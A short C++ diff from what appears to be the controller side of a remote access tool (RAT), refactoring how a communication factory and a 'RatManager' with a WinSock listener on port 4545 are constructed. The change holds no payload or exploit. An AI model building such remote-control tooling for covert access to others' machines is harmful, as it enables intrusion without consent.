@@ -2,8 +2,16 @@
 
 #include "Trace.h"
 #include "Entrypoint.h"
+#include "ICommunicationFactory.h"
+#include "IRatManager.h"
 
 Entrypoint::Entrypoint()
+	:
+	_factory(CreateFactory()),
+	_manager(
+		CreateRatManager(
+			_factory.get(),
+			_factory->CreateWinSockConnectionListener(4545)))
 {
 	Startup();
 
@@ -43,12 +51,6 @@ void Entrypoint::Startup()
 	_commands["list"] = [this] { ListClients(); };
 
 	Trace("> ");
-
-	_factory = CreateFactory();
-
-	_manager = std::make_unique<RatManager>(
-		_factory.get(),
-		_factory->CreateWinSockConnectionListener(4545));
 }
 
 void Entrypoint::SendChatMessage()
